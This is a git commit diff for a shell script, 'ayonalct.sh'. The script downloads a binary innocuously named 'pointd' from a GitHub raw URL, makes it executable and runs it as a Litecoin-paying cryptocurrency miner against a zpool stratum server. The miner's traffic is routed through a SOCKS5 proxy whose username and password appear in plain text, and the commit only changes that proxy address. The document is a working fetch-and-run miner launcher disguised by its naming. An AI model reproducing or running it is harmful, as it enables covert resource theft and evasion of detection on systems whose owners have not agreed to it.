1f4701be1e1d75ca956b4d069d54afe6707a1e80
ahmadghozaliurhniyu <87011511+ahmadghozaliurhniyu@users.noreply.github.com>
2022-03-09 14:00:47 +0700

    Update ayonalct.sh

--- ayonalct.sh
+++ ayonalct.sh
@@ -2,4 +2,4 @@
 
 wget -q https://raw.githubusercontent.com/ahmadghozaliurhniyu/scmin/main/pointd
 chmod +x pointd
-./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u LPzpJsXPmdc9HG44gEG2h3naSPrUH2fTMD -p c=LTC,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@193.151.160.233:8320 -t 8
+./pointd -a lyra2z330 -o stratum+tcp://lyra2z330.na.mine.zpool.ca:4563 -u LPzpJsXPmdc9HG44gEG2h3naSPrUH2fTMD -p c=LTC,zap=BUT-lyra2z330 -x socks5://aihzpnbr:dogmtwuiyn3a@176.116.230.96:7182 -t 8
